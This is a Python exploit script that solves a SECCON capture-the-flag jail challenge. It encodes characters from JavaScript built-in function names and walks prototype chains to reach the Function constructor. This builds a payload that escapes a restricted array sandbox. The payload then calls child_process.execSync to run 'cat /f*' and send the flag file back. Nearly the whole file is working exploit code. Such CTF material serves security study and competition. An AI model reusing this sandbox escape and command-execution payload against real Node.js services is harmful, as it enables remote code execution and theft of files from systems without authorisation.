import ptrlib
import os

io = ptrlib.Socket(
    os.getenv("SECCON_HOST", "localhost"),
    int(os.getenv("SECCON_PORT", 5000)),
)
io.debug = True

char_table = {
    "a": f"root.shift.call(root.slice.call({"root.at"}.name.toString(ANY)))",
    "b": f"root.shift.call(root.slice.call({"root.at.name.big"}.name.toString(ANY)))",
    "c": f"root.shift.call(root.slice.call({"root.concat"}.name.toString(ANY)))",
    "d": f"root.shift.call(root.slice.call({"root.__proto__.__proto__.constructor.defineProperty"}.name.toString(ANY)))",
    "e": f"root.shift.call(root.slice.call({"root.every"}.name.toString(ANY)))",
    "f": f"root.shift.call(root.slice.call({"root.flat"}.name.toString(ANY)))",
    "g": f"root.pop.call(root.slice.call({"root.toString"}.name.toString(ANY)))",
    "h": f"root.pop.call(root.slice.call({"root.with"}.name.toString(ANY)))",
    "i": f"root.shift.call(root.slice.call({"root.includes"}.name.toString(ANY)))",
    "j": f"root.shift.call(root.slice.call({"root.join"}.name.toString(ANY)))",
    "k": f"root.shift.call(root.slice.call({"root.keys"}.name.toString(ANY)))",
    "l": f"root.shift.call(root.slice.call({"root.lastIndexOf"}.name.toString(ANY)))",
    "m": f"root.shift.call(root.slice.call({"root.map"}.name.toString(ANY)))",
    "n": f"root.pop.call(root.slice.call({"root.join"}.name.toString(ANY)))",
    "o": f"root.shift.call(root.slice.call({"root.constructor.of"}.name.toString(ANY)))",
    "p": f"root.pop.call(root.slice.call({"root.map"}.name.toString(ANY)))",
    "Q": "root.at.name.constructor.fromCharCode(root.push.call(root.slice.call(root.join.call(root.slice.call(root.at.name.isWellFormed.toString(ANY))))))",
    "r": f"root.shift.call(root.slice.call({"root.reduce"}.name.toString(ANY)))",
    "s": f"root.pop.call(root.slice.call({"root.includes"}.name.toString(ANY)))",
    "t": f"root.shift.call(root.slice.call({"root.toString"}.name.toString(ANY)))",
    "u": f"root.shift.call(root.slice.call({"root.unshift"}.name.toString(ANY)))",
    "v": f"root.shift.call(root.slice.call({"root.values"}.name.toString(ANY)))",
    "w": f"root.shift.call(root.slice.call({"root.with"}.name.toString(ANY)))",
    "x": "root.pop.call(root.sort.call(root.slice.call(root.at.name.indexOf.name.toString(ANY))))",
    "y": f"root.pop.call(root.slice.call({"root.every"}.name.toString(ANY)))",
    " ": "root.at.name.constructor.fromCharCode(root.push.call(root.slice.call(root.map.toString(ANY))))",
    '"': "root.at.name.constructor.fromCharCode(root.push.call(root.slice.call(root.every.toString(ANY))))",
    "(": "root.at.name.constructor.fromCharCode(root.push.call(root.slice.call(root.reduceRight.toString(ANY))))",
    ")": "root.at.name.constructor.fromCharCode(root.push.call(root.slice.call(root.at.name.isWellFormed.toString(ANY))))",
    "*": "root.at.name.constructor.fromCharCode(root.push.call(root.slice.call(root.findLastIndex.toString(ANY))))",
    ".": "root.at.name.constructor.fromCharCode(root.push.call(root.slice.call(root.at.name.toLocaleLowerCase.toString(ANY))))",
    "/": "root.at.name.constructor.fromCharCode(root.push.call(root.slice.call(root.join.call(root.slice.call(root.__proto__.__proto__.constructor.getOwnPropertyDescriptor.name.toString(ANY))))))",
    "_": "root.at.name.constructor.fromCharCode(root.push.call(root.slice.call(root.join.call(root.slice.call(root.__proto__.__proto__.constructor.getOwnPropertyNames.toString(ANY))))))",
}

lines: list[str] = []

lines.append("root.push(root.at.call)")


def add_char(c: str):
    if c in char_table:
        line = char_table[c]
    elif c.lower() in char_table:
        line = f"root.at.name.toUpperCase.call({char_table[c.lower()]})"
    elif c.upper() in char_table:
        line = f"root.at.name.toLowerCase.call({char_table[c.upper()]})"
    else:
        assert False, c
    line = f"root.push({line})"
    lines.append(line)


cmd = 'console.log(process.mainModule.require("child_process").execSync("cat /f*").toString())//'

for c in cmd:
    add_char(c)

lines.append("root.push(root.shift(ANY))")
lines.append("root.push(root.join(root.at.name.__proto__.toString(ANY)))")

for _ in range(len(cmd)):
    lines.append("root.shift(ANY)")
# assert root == [root.at.call, cmd]


lines += """
root.push(root.__proto__.__proto__.constructor.values(root.__proto__.__proto__.constructor.getOwnPropertyDescriptors(root.__proto__.__proto__.constructor.getPrototypeOf(root.at.bind(ANY)))))
""".strip().splitlines()
# root.push(Object.values(Object.getOwnPropertyDescriptors(Function.prototype)))

lines += """
root.shift.call(root.pop.call(root.slice(UNDEFINED)))
root.shift.call(root.pop.call(root.slice(UNDEFINED)))
root.shift.call(root.pop.call(root.slice(UNDEFINED)))
root.shift.call(root.pop.call(root.slice(UNDEFINED)))
root.pop.call(root.pop.call(root.slice(UNDEFINED)))
root.pop.call(root.pop.call(root.slice(UNDEFINED)))
root.pop.call(root.pop.call(root.slice(UNDEFINED)))
root.pop.call(root.pop.call(root.slice(UNDEFINED)))
""".strip().splitlines()
# assert root == [root.at.call, cmd, [ { value: Function, writable: true, enumerable: false, configurable: true } ]]

lines += """
root.push(root.__proto__.__proto__.constructor.values(root.pop.call(root.pop(ANY))))
""".strip().splitlines()
# assert root == [root.at.call, cmd, [ Function, true, false, true ]]

lines += """
root.pop.call(root.pop.call(root.slice(UNDEFINED)))
root.pop.call(root.pop.call(root.slice(UNDEFINED)))
root.pop.call(root.pop.call(root.slice(UNDEFINED)))
""".strip().splitlines()
# assert root == [root.at.call, cmd, [ Function ]]

lines += """
root.push(root.shift(ANY))
root.push(root.length.toString(ANY))
root.push(root.shift(ANY))
""".strip().splitlines()
# assert root == [[ Function ], root.at.call, "0", cmd]

lines += """
root.unshift(root.constructor.of(root.slice(root.at.length.toString(ANY))))
""".strip().splitlines()
# root.unshift(Array.of(root.slice(1)))
# assert root == [[[root.at.call, "0", cmd]], [ Function ], root.at.call, "0", cmd]

lines += """
root.pop(ANY)
root.pop(ANY)
root.pop(ANY)
root.reverse(ANY)
""".strip().splitlines()
# assert root == [[ Function ], [[root.at.call, "0", cmd]]]

lines += """
root.push(root.flat(UNDEFINED))
root.shift(ANY)
root.shift(ANY)
""".strip().splitlines()
# assert root == [[Function, [root.at.call, "0", cmd]]]


lines += """
root.push(root.shift.call(root.pop.call(root.slice.call(root.pop.call(root.slice(UNDEFINED))))))
""".strip().splitlines()
# assert root == [[Function, ["0", cmd]], root.at.call]


lines += """
root.push(root.at.apply.bind(root.pop(ANY)))
""".strip().splitlines()
# root.push(root.toString.apply.bind(root.at.call))
# assert root == [[Function, ["0", cmd]], root.at.apply.bind(root.at.call)]

lines += """
root.push(root.reduce.bind(root.shift(ANY)))
""".strip().splitlines()
# assert root == [root.at.apply.bind(root.at.call), [].reduce.bind([Function, ["0", cmd]])]


lines += """
root.push(root.at.apply.bind(root.pop(ANY)))
""".strip().splitlines()
# assert root == [root.at.apply.bind(root.at.call), root.at.apply.bind([].reduce.bind([Function, ["0", cmd]]))]


lines += """
root.push(ANY)
root.push(root.constructor.of(root.shift(ANY)))
""".strip().splitlines()
# assert root == [
#     root.at.apply.bind([].reduce.bind([Function, ["0", cmd]])),
#     ANY,
#     [root.at.apply.bind(root.at.call)]
# ]


lines += """
root.at.call.call(root.reduce(root.shift(ANY)))
""".strip().splitlines()
# root.at.call.call(root.reduce(root.shift(ANY))))
# // ->
# root.at.call.call(
#     [ANY, [root.at.apply.bind(root.at.call)]].reduce(
#         root.at.apply.bind([].reduce.bind([Function, ["0", cmd]]))
#     )
# )
# // ->
# root.at.call.call(
#     root.at.apply.bind([].reduce.bind([Function, ["0", cmd]]))(
#         ANY,
#         [root.at.apply.bind(root.at.call)]
#     )
# )
# // ->
# root.at.call.call(
#     [].reduce.bind([Function, ["0", cmd]]).apply(
#         ANY,
#         [root.at.apply.bind(root.at.call)]
#     )
# )
# // ->
# root.at.call.call(
#     [Function, ["0", cmd]].reduce(root.at.apply.bind(root.at.call))
# )
# // ->
# root.at.call.call(
#     root.at.apply.bind(root.at.call)(Function, ["0", cmd])
# )
# // ->
# root.at.call.call(
#     root.at.call.apply(Function, ["0", cmd])
# )
# // ->
# root.at.call.call(
#     Function.bind("0", cmd)
# )
# // ->
# Function.bind("0", cmd)()


code = lines[0]
for line in lines[1:]:
    if "UNDEFINED" in line:
        code = line.replace("UNDEFINED", f"root.__lookupGetter__({code})")
    elif "ANY" in line:
        code = line.replace("ANY", code)
    else:
        assert False


io.sendlineafter(b"Your code: ", code.encode())
flag = io.recvline().decode().strip()

print(f"{len(code) = }")
print(f"{flag = }")
